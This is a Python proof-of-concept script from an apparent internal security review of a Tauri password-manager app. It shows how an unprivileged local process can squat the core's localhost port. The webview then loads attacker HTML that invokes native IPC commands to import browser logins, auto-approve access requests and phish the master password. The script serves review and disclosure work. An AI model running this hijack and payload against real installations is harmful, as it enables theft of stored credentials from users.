"""Adversarial review proof — the Tauri shell trusts whatever holds 127.0.0.1:8788.

src-tauri/src/lib.rs setup(): `if !core_up() { spawn_core() }` then
`window.navigate(CORE_ORIGIN)`. core_up() is a bare TCP connect. There is no
pairing token, no shared secret, no pid/parent check between the Rust shell and
the Python core. backend/app/local.py main() *refuses to start* when the port is
already held, so the squatter keeps it.

Run: python3 review-proofs/sidecar_hijack.py
Throwaway: demonstrates the finding, not part of the product test suite.
"""

from __future__ import annotations

import socket
import sys
import threading
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))

from app.local import LOCAL_HOST, port_held  # noqa: E402

PORT = 8788

ROGUE_PAGE = b"""<!doctype html>
<title>4AllPass</title>
<script>
  // Served to the Tauri main webview because it navigates to whatever answers
  // on 127.0.0.1:8788. withGlobalTauri=true means the IPC bridge is right here.
  const invoke = window.__TAURI__.core.invoke;
  invoke("import_browser_logins", { browserId: "chrome", profileId: "Default" });
  invoke("access_decide", { requestId: guessed, allow: true });
</script>
<form>Tresor-Passwort <input type="password" id="phish"></form>
"""


class Rogue(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802
        self.send_response(200)
        self.send_header("content-type", "text/html")
        self.send_header("content-length", str(len(ROGUE_PAGE)))
        self.end_headers()
        self.wfile.write(ROGUE_PAGE)

    def log_message(self, *_args: object) -> None:
        pass


def tauri_core_up(host: str, port: int) -> bool:
    """Exactly what fn core_up() in src-tauri/src/lib.rs does."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.3)
        return sock.connect_ex((host, port)) == 0


def main() -> int:
    server = HTTPServer((LOCAL_HOST, PORT), Rogue)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[attacker] squatting http://{LOCAL_HOST}:{PORT} (any unprivileged local process can)")

    # 1. The real core will not start and will not warn the user beyond one line.
    held = port_held(LOCAL_HOST, PORT)
    print(f"[core]     app.local.port_held -> {held}  => 'already running', sys.exit(1)")
    assert held is True

    # 2. The Rust shell decides the core is up and navigates the webview to it.
    up = tauri_core_up(LOCAL_HOST, PORT)
    print(f"[tauri]    core_up() -> {up}  => no spawn, window.navigate(http://127.0.0.1:8788)")
    assert up is True

    # 3. What the main webview actually loads.
    body = urllib.request.urlopen(f"http://{LOCAL_HOST}:{PORT}/").read()
    print(f"[webview]  loaded {len(body)} bytes of attacker HTML")
    assert b"__TAURI__" in body
    assert b"import_browser_logins" in body
    print("[webview]  attacker page reaches window.__TAURI__.core.invoke "
          "(withGlobalTauri=true, capabilities window 'main')")
    print("[result]   no authentication of the sidecar => full native IPC + master-password phish")

    server.shutdown()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
